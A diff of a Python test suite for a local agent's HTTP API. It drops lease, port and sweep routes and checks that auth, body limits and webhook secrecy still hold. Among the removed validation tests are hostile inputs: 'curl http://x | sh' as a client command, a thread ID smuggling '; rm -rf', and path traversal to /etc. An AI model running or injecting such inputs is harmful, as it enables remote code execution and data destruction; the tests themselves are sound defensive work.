@@ -1,5 +1,5 @@
 """Pruebas del servidor HTTP del agente (chopshop.agent.server) con un servidor REAL en loopback y puerto efímero que vive
-solo durante cada test. Todo lo externo es falso: /proc, systemd, T3, tailscale y el poster de webhooks; la DB es temporal.
+solo durante cada test. Todo lo externo es falso: /proc, T3, tailscale y el poster de webhooks; la DB es temporal.
 Sin hilos de fondo (se muestrea a mano) salvo en test_agent_service.py."""
 import copy
 import http.client
@@ -20,7 +20,6 @@ from chopshop import settings  # noqa: E402
 from chopshop.agent import collector as collector_mod, db, events, server, t3watch  # noqa: E402
 from chopshop.agent.service import AgentService  # noqa: E402
 from test_agent_collector import FakeProc  # noqa: E402
-from test_agent_resources import FakeSystemd  # noqa: E402
 
 TOKEN = "tok-3f9a-no-debe-salir-nunca"
 WEBHOOK_URL = "https://hooks.example.test/canary-url-secreta"          # solo vive en un archivo temporal
@@ -83,7 +82,7 @@ class ServerBase(unittest.TestCase):
         self.tmp = tempfile.mkdtemp(prefix="chopshop-srv-")
         self.addCleanup(shutil.rmtree, self.tmp, True)
         self.clock = Clock()
-        self.sd, self.ts, self.t3calls, self.posts = FakeSystemd(), FakeTailscale(), FakeT3(), []
+        self.ts, self.t3calls, self.posts = FakeTailscale(), FakeT3(), []
         self.token_file = os.path.join(self.tmp, "token")
         with open(self.token_file, "w") as f:
             f.write(TOKEN + "\n")
@@ -111,14 +110,14 @@ class ServerBase(unittest.TestCase):
         cfg.update(machine_id="host-a", db_path=os.path.join(self.tmp, "agent", "agent.db"), token_file=self.token_file,
                    projects_root=os.path.join(self.tmp, "projects"), worktrees_root=os.path.join(self.tmp, "worktrees"),
                    bind="127.0.0.1", port=0, owner_login="yo@github", allowed_logins=["lector@github"], import_legacy=False)
-        cfg["projects"] = {"proyecto-demo": {"test_server": {"cmd": "pnpm dev", "port_env": "PORT"}}}
+        cfg["projects"] = {"proyecto-demo": {}}
         cfg["t3"] = {"helper": "/nonexistente/t3mcp.mjs"}
         cfg.update(over)
         conn = db.connect(cfg["db_path"])
         self.addCleanup(conn.close)
         coll = collector_mod.Collector(cfg, conn, proc_root=self.proc.root, clock=self.clock, clk_tck=100, page_size=4096)
         self.svc = AgentService(cfg, conn=conn, collector=coll, t3=t3watch.T3(cfg, runner=self.t3calls), runner=self.ts,
-                                resources_runner=self.sd, poster=lambda url, data, timeout: self.posts.append((url, data)) or 200,
+                                poster=lambda url, data, timeout: self.posts.append((url, data)) or 200,
                                 orchestrator_fn=orchestrator or (lambda: None), clock=self.clock, **(svc_kw or {}))
         self.svc.start(background=background)
         self.addCleanup(self.svc.stop)
@@ -180,30 +179,27 @@ class TestRoutes(ServerBase):
         self.add_thread("t-1", pending=[{"request_id": "r-1", "questions": [{"id": "q1"}]}], status="waiting")
         self.add_thread("t-2", status="running")
         self.add_thread("t-3", status="completed", settled=1, project="otro")
-        self.post("/leases/request", {"project": "proyecto-demo"})
+        self.svc.emit("prueba", "proyecto-demo", {"i": 1})
         st, snap, _ = self.get("/snapshot")
         self.assertEqual(st, 200)
         self.assertEqual(sorted(snap), sorted([
             "api_version", "machine_id", "ts", "generated", "machine", "apps", "projects", "threads", "pending_questions",
-            "leases", "events", "subscriptions", "orchestrator", "agent"]))
+            "events", "subscriptions", "orchestrator", "agent"]))
         self.assertEqual((snap["api_version"], snap["machine_id"]), (1, "host-a"))
         self.assertTrue({"cpus", "load", "cpu_pct", "ram_total_mb", "ram_avail_mb", "ram_pct", "swap_used_mb", "disk_used_gb",
                          "disk_total_gb", "disk_pct", "os", "uptime"} <= set(snap["machine"]))
-        self.assertEqual(sorted(snap["leases"]), ["active", "capacity", "queued"])
-        self.assertTrue({"max_servers", "used", "cpu_pct_used", "ram_avail_mb"} <= set(snap["leases"]["capacity"]))
         self.assertEqual(sorted(snap["agent"]), ["last_poll_age", "last_sample_age", "t3_ok", "uptime", "version"])
         self.assertIsNone(snap["orchestrator"])
         self.assertEqual(snap["agent"]["last_sample_age"], 0.0)
         proj = {p["name"]: p for p in snap["projects"]}
-        self.assertTrue({"name", "cpu_pct", "rss_mb", "procs", "threads_running", "threads_pending", "leases_active",
-                         "leases_queued"} <= set(proj["proyecto-demo"]))
-        self.assertEqual((proj["proyecto-demo"]["threads_running"], proj["proyecto-demo"]["threads_pending"],
-                          proj["proyecto-demo"]["leases_active"]), (1, 1, 1))
+        self.assertTrue({"name", "cpu_pct", "rss_mb", "procs", "threads_running", "threads_pending"} <= set(proj["proyecto-demo"]))
+        self.assertFalse({"leases_active", "leases_queued"} & set(proj["proyecto-demo"]))     # contrato sin leases
+        self.assertEqual((proj["proyecto-demo"]["threads_running"], proj["proyecto-demo"]["threads_pending"]), (1, 1))
         self.assertEqual(snap["pending_questions"], [{"thread_id": "t-1", "project": "proyecto-demo", "request_id": "r-1",
                                                       "questions": [{"id": "q1"}]}])
         self.assertEqual(sorted(snap["threads"][0]), ["branch", "link", "pending", "project", "pull_requests", "settled",
                                                       "status", "thread_id", "title", "updated", "worktree"])
-        self.assertEqual(snap["events"][0]["event"], "lease_active")                       # más nuevo primero
+        self.assertEqual(snap["events"][0]["event"], "prueba")                             # más nuevo primero
         # el contrato del doc nombra cada clave de primer nivel
         with open(os.path.join(ROOT, "docs", "agent-api.md"), encoding="utf-8") as f:
             doc = f.read()
@@ -263,63 +259,11 @@ class TestRoutes(ServerBase):
         self.assertTrue(next(t for t in body["threads"] if t["thread_id"] == "t-2")["settled"])
         self.assertEqual([t["thread_id"] for t in self.get("/threads?project=otro")[1]["threads"]], ["t-2"])
 
-    def test_leases_ports_request_touch_release(self):
-        st, lease, _ = self.post("/leases/request", {"project": "proyecto-demo", "thread_id": "t-9"})
-        self.assertEqual((st, lease["state"], lease["kind"]), (200, "active", "test_server"))
-        self.assertTrue(lease["unit"].startswith("chopshop-ts-proyecto-demo-"))
-        self.assertEqual(len(self.sd.started()), 1)
-        for path in ("/leases", "/ports"):
-            body = self.get(path)[1]
-            self.assertEqual(sorted(body), ["active", "capacity", "ports", "queued"])
-        self.assertEqual(self.get("/leases")[1]["active"][0]["id"], lease["id"])
-        self.assertEqual(self.get("/ports")[1]["ports"][0]["port"], lease["port"])
-        self.assertEqual(self.post("/leases/touch", {"lease_id": lease["id"]})[1]["id"], lease["id"])
-        self.assertEqual(self.post("/leases/touch", {"lease_id": "l-9999"})[0], 404)
-        self.assertEqual(self.post("/leases/touch", {})[0], 400)
-        st, rel, _ = self.post("/leases/release", {"thread_id": "t-9"})
-        self.assertEqual((st, [x["id"] for x in rel["released"]]), (200, [lease["id"]]))
-        self.assertEqual(self.sd.stopped, [lease["unit"] + ".service"])
-        self.assertEqual(self.post("/leases/release", {})[0], 400)               # sin criterio
-
-    def test_request_port_kind_and_worktree(self):
-        wt = os.path.join(self.tmp, "worktrees", "proyecto-demo", "wt-uno")
-        st, lease, _ = self.post("/leases/request", {"project": "proyecto-demo", "worktree": wt, "kind": "port"})
-        self.assertEqual((st, lease["kind"], lease["state"], lease["worktree"]), (200, "port", "active", wt))
-        self.assertEqual(self.sd.started(), [])                                  # un puerto no lanza ningún proceso
-        st, rel, _ = self.post("/leases/release", {"worktree": wt})
-        self.assertEqual(len(rel["released"]), 1)
-
-    def test_request_validation(self):
-        bad = [{}, {"project": 5}, {"project": "proyecto-demo", "kind": "otra"}, {"project": "proyecto-demo", "wait_seconds": -1},
-               {"project": "proyecto-demo", "wait_seconds": "x"}, {"project": "proyecto-demo", "wait_seconds": 99999},
-               {"project": "proyecto-demo", "worktree": "/etc"},
-               {"project": "proyecto-demo", "worktree": os.path.join(self.tmp, "projects", "..", "..", "etc")},
-               {"project": "proyecto-demo", "thread_id": "con espacios; rm -rf"}]
-        for body in bad:
-            self.assertEqual(self.post("/leases/request", body)[0], 400, body)
-        self.assertEqual(self.sd.started(), [])
-
-    def test_cmd_from_client_is_refused_unless_allowed(self):
-        st, body, _ = self.post("/leases/request", {"project": "proyecto-demo", "cmd": "curl http://x | sh"})
-        self.assertEqual(st, 400)
-        self.assertIn("cmd no permitido", body["error"])
-        self.assertEqual(self.sd.started(), [])
-        self.svc.cfg["allow_request_cmd"] = True
-        st, lease, _ = self.post("/leases/request", {"project": "proyecto-demo", "cmd": "python3 -m http.server"})
-        self.assertEqual((st, lease["cmd"]), (200, "python3 -m http.server"))
-
-    def test_request_without_configured_command_fails_clean(self):
-        os.makedirs(os.path.join(self.tmp, "projects", "sin-cmd"))
-        st, lease, _ = self.post("/leases/request", {"project": "sin-cmd"})
-        self.assertEqual((st, lease["state"]), (200, "failed"))
-        self.assertEqual(self.get("/events")[1]["events"][-1]["event"], "lease_failed")
-
-    def test_sweep(self):
-        st, rep, _ = self.post("/sweep", {"dry_run": True})
-        self.assertEqual((st, rep["dry_run"]), (200, True))
-        self.assertTrue({"units", "ports", "agent_scopes", "orphans"} <= set(rep))
-        self.assertEqual(self.post("/sweep", {"dry_run": "si"})[0], 400)
-        self.assertFalse(self.post("/sweep", {})[1]["dry_run"])
+    def test_removed_routes_are_404(self):
+        # servers de prueba, puertos y barrido de huérfanos son cosa de T3: la API ya no los expone
+        for method, path in (("GET", "/leases"), ("GET", "/ports"), ("POST", "/leases/request"), ("POST", "/leases/release"),
+                             ("POST", "/leases/touch"), ("POST", "/sweep")):
+            self.assertEqual(self.req(method, path, body={} if method == "POST" else None)[0], 404, path)
 
     def test_settle_and_answer(self):
         st, body, _ = self.post("/settle", {"thread_id": "t-1"})
@@ -349,20 +293,20 @@ class TestRoutes(ServerBase):
 
     def test_subscriptions_never_leak_the_url(self):
         st, body, _ = self.post("/subscriptions", {"name": "bot", "webhook_file": self.wfile, "project": "proyecto-demo",
-                                                   "events": ["lease_active"]})
+                                                   "events": ["pending_question"]})
         self.assertEqual((st, body["name"]), (200, "bot"))
-        self.assertEqual(body["subscription"]["events"], ["lease_active"])
+        self.assertEqual(body["subscription"]["events"], ["pending_question"])
         self.assertEqual(self.post("/subscriptions", {"name": "x", "webhook_file": "https://hooks.example.test/a"})[0], 400)
         self.assertEqual(self.post("/subscriptions", {"name": "x", "webhook_file": "/no/existe"})[0], 400)
         self.assertEqual(self.post("/subscriptions", {"name": "mal nombre", "webhook_file": self.wfile})[0], 400)
         self.assertEqual(self.post("/subscriptions", {"webhook_file": self.wfile})[0], 400)
         self.assertEqual(list(self.get("/subscriptions")[1]["subscriptions"]), ["bot"])
-        self.assertEqual(self.get("/snapshot")[1]["subscriptions"], {"bot": {"project": "proyecto-demo", "events": ["lease_active"]}})
-        self.post("/leases/request", {"project": "proyecto-demo"})            # dispara lease_active -> webhook
+        self.assertEqual(self.get("/snapshot")[1]["subscriptions"], {"bot": {"project": "proyecto-demo", "events": ["pending_question"]}})
+        self.svc.emit("pending_question", "proyecto-demo", {"thread_id": "t-1"})   # dispara el webhook
         events.flush(5)
         self.assertEqual(len(self.posts), 1)
         self.assertEqual(self.posts[0][0], WEBHOOK_URL)                       # la URL salió del archivo, no de la API
-        self.assertEqual(self.get("/events")[1]["events"][-1]["event"], "lease_active")
+        self.assertEqual(self.get("/events")[1]["events"][-1]["event"], "pending_question")
         st, body, _ = self.req("DELETE", "/subscriptions/bot")
         self.assertEqual((st, body), (200, {"ok": True, "name": "bot"}))
         self.assertEqual(self.req("DELETE", "/subscriptions/bot")[0], 404)
@@ -381,16 +325,16 @@ class TestRoutes(ServerBase):
         self.assertEqual(self.get("/health/")[0], 200)                         # barra final tolerada
 
     def test_body_limits_and_parsing(self):
-        big = b'{"project":"' + b"x" * (server.MAX_BODY + 10) + b'"}'
-        st, body, _ = self.req("POST", "/leases/request", raw=big)
+        big = b'{"thread_id":"' + b"x" * (server.MAX_BODY + 10) + b'"}'
+        st, body, _ = self.req("POST", "/settle", raw=big)
         self.assertEqual(st, 413)
-        self.assertEqual(self.req("POST", "/leases/request", raw=b"{no json")[0], 400)
-        self.assertEqual(self.req("POST", "/leases/request", raw=b"[1,2]")[0], 400)
-        self.assertEqual(self.req("POST", "/leases/request", raw=b"\xff\xfe")[0], 400)
-        self.assertEqual(self.req("POST", "/sweep", raw=b"")[0], 200)           # sin cuerpo = {}
+        self.assertEqual(self.req("POST", "/settle", raw=b"{no json")[1]["error"], "el cuerpo debe ser JSON UTF-8")
+        self.assertEqual(self.req("POST", "/settle", raw=b"[1,2]")[1]["error"], "el cuerpo debe ser un objeto JSON")
+        self.assertEqual(self.req("POST", "/settle", raw=b"\xff\xfe")[0], 400)
+        self.assertEqual(self.req("POST", "/settle", raw=b"")[1]["error"], "thread_id es obligatorio")   # sin cuerpo = {}
         # chunked: no se acepta (exige Content-Length)
         s = socket.create_connection((self.host, self.port), timeout=5)
-        s.sendall(b"POST /sweep HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
+        s.sendall(b"POST /settle HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
         data = s.recv(4096)
         s.close()
         self.assertTrue(data.startswith(b"HTTP/1.0 411") or data.startswith(b"HTTP/1.1 411"), data[:40])
@@ -400,8 +344,8 @@ class TestRoutes(ServerBase):
         self.assertLessEqual(server.Handler.timeout, 60)
 
     def test_internal_errors_do_not_leak(self):
-        self.svc.resources.status = lambda: 1 / 0
-        st, body, _ = self.get("/leases")
+        self.svc.collector.latest = lambda: 1 / 0
+        st, body, _ = self.get("/snapshot")
         self.assertEqual((st, body), (500, {"error": "error interno"}))
 
     def test_logs_have_no_token_or_query(self):
@@ -425,7 +369,7 @@ class TestAuth(ServerBase):
     def test_tailscale_plus_token(self):
         self.start(auth="tailscale+token", trust_local=False)
         # sin identidad -> 403 en TODO, incluidas rutas que no existen (no se puede sondear)
-        for method, path in (("GET", "/health"), ("GET", "/snapshot"), ("GET", "/nada"), ("POST", "/sweep"), ("DELETE", "/health")):
+        for method, path in (("GET", "/health"), ("GET", "/snapshot"), ("GET", "/nada"), ("POST", "/settle"), ("DELETE", "/health")):
             st, body, _ = self.req(method, path, headers=self.bearer())
             self.assertEqual((st, body["error"]), (403, "sin identidad válida"), (method, path))
         # lector: GET sí, POST no (ni con bearer)
@@ -433,16 +377,16 @@ class TestAuth(ServerBase):
         self.svc.auth._whois.clear()                       # el fallo anterior queda en cache unos segundos
         st, body, _ = self.get("/health")
         self.assertEqual((st, body["whoami"]), (200, {"login": "lector@github", "via": "tailscale", "write": False}))
-        self.assertEqual(self.post("/sweep", {"dry_run": True}, headers=self.bearer())[0], 403)
+        self.assertEqual(self.post("/settle", {"thread_id": "t-1"}, headers=self.bearer())[0], 403)
         # propietario: GET sí; POST exige además el bearer
         self.ts.logins["127.0.0.1"] = "yo@github"
         self.svc.auth._whois.clear()
         self.assertEqual(self.get("/health")[1]["whoami"], {"login": "yo@github", "via": "tailscale", "write": False})
-        self.assertEqual(self.post("/sweep", {"dry_run": True})[0], 403)
-        self.assertEqual(self.post("/sweep", {"dry_run": True}, headers=self.bearer("otro"))[0], 403)
-        self.assertEqual(self.post("/sweep", {"dry_run": True}, headers={"Authorization": "Basic " + TOKEN})[0], 403)
-        st, body, _ = self.post("/sweep", {"dry_run": True}, headers=self.bearer())
-        self.assertEqual((st, body["dry_run"]), (200, True))
+        self.assertEqual(self.post("/settle", {"thread_id": "t-1"})[0], 403)
+        self.assertEqual(self.post("/settle", {"thread_id": "t-1"}, headers=self.bearer("otro"))[0], 403)
+        self.assertEqual(self.post("/settle", {"thread_id": "t-1"}, headers={"Authorization": "Basic " + TOKEN})[0], 403)
+        st, body, _ = self.post("/settle", {"thread_id": "t-1"}, headers=self.bearer())
+        self.assertEqual((st, body["ok"]), (200, True))
         self.assertEqual(self.get("/health", headers=self.bearer())[1]["whoami"]["write"], True)
         # identidad desconocida
         self.ts.logins["127.0.0.1"] = "intruso@github"
@@ -480,8 +424,8 @@ class TestAuth(ServerBase):
         self.assertEqual(self.get("/health", headers=self.bearer("mal"))[0], 403)
         st, body, _ = self.get("/health", headers=self.bearer())
         self.assertEqual((st, body["whoami"]), (200, {"login": None, "via": "token", "write": True}))
-        self.assertEqual(self.post("/sweep", {"dry_run": True}, headers=self.bearer())[0], 200)
-        self.assertEqual(self.post("/sweep", {"dry_run": True})[0], 403)
+        self.assertEqual(self.post("/settle", {"thread_id": "t-1"}, headers=self.bearer())[0], 200)
+        self.assertEqual(self.post("/settle", {"thread_id": "t-1"})[0], 403)
         self.assertEqual(self.ts.calls, [])                                    # en modo token no se consulta a Tailscale
         os.unlink(self.token_file)                                             # sin archivo de token nadie entra
         self.assertEqual(self.get("/health", headers=self.bearer())[0], 403)
@@ -494,7 +438,7 @@ class TestAuth(ServerBase):
     def test_local_origin_trusted_by_default(self):
         self.start(auth="none-local")
         self.assertEqual(self.get("/health")[1]["whoami"]["via"], "local")
-        self.assertEqual(self.post("/sweep", {"dry_run": True})[0], 200)
+        self.assertEqual(self.post("/settle", {"thread_id": "t-1"})[0], 200)
         self.assertEqual(self.ts.calls, [])
 
     def test_token_file_changes_are_picked_up_and_compare_is_constant_time(self):
@@ -558,7 +502,7 @@ class TestCleanStop(ServerBase):
 
 
 class TestCpuConvention(ServerBase):
-    """`machine.cpu_pct` es 0-100 de TODA la máquina; apps/proyectos y `Resources._cpu_used` usan 100 = un núcleo."""
+    """`machine.cpu_pct` es 0-100 de TODA la máquina; apps/proyectos usan 100 = un núcleo."""
 
     def test_machine_vs_core_percent(self):
         self.start()
@@ -570,22 +514,10 @@ class TestCpuConvention(ServerBase):
         self.assertEqual(snap["machine"]["cpus"], 4)
         self.assertEqual(next(a for a in snap["apps"] if a["name"] == "node")["cpu_pct"], 100.0)
         self.assertEqual(snap["projects"][0]["cpu_pct"], 100.0)
-        res = self.svc.resources
-        self.assertEqual(res._cpu_used(snap["machine"]), 200.0)             # 50 % de 4 núcleos = 2 núcleos = 200 en la escala del tope
-        self.assertEqual(res.status()["capacity"]["cpu_pct_used"], 200)
-        self.assertEqual(self.get("/snapshot")[1]["leases"]["capacity"]["cpu_pct_used"], 200)
+        api = self.get("/snapshot")[1]
+        self.assertEqual(api["machine"]["cpu_pct"], 50.0)
+        self.assertEqual(next(p for p in api["projects"] if p["name"] == "proyecto-demo")["cpu_pct"], 100.0)
 
-    def test_queue_uses_core_scale(self):
-        self.start()
-        self.svc.resources.cap["max_cpu_pct"] = 150
-        self.sample(busy=100, idle=900)
-        self.sample(busy=600, idle=1400)                       # 200 (núcleo = 100) >= 150 -> no cabe
-        st, lease, _ = self.post("/leases/request", {"project": "proyecto-demo"})
-        self.assertEqual((st, lease["state"], lease["position"]), (200, "queued", 1))
-        self.assertEqual(self.sd.started(), [])
-        self.svc.resources.cap["max_cpu_pct"] = 250
-        self.svc.resources.tick(sweep=False)                   # ahora 200 < 250 -> sale de la cola
-        self.assertEqual(self.get("/leases")[1]["active"][0]["id"], lease["id"])
 
 
 if __name__ == "__main__":
